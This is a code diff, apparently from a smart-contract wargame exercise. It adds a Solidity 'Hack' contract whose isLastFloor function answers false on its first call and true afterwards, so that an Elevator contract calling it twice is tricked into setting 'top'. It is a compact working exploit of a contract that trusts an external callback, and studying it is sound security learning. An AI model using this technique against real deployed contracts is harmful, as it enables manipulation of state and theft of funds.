@@ -5,6 +5,27 @@ interface Building {
     function isLastFloor(uint) external returns (bool);
 }
 
+contract Hack {
+    Elevator public elevator;
+    Building public building;
+    uint private floorCounter;
+
+    constructor(address _elevatorAddress) {
+        building = Building(address(this));
+        elevator = Elevator(_elevatorAddress);
+    }
+
+    function isLastFloor(uint _floor) external returns (bool) {
+        _floor = floorCounter;
+        floorCounter++;
+        return _floor == 0 ? false : true;
+    }
+
+    function attack() external {
+        elevator.goTo(123);
+    }
+}
+
 contract Elevator {
     bool public top;
     uint public floor;
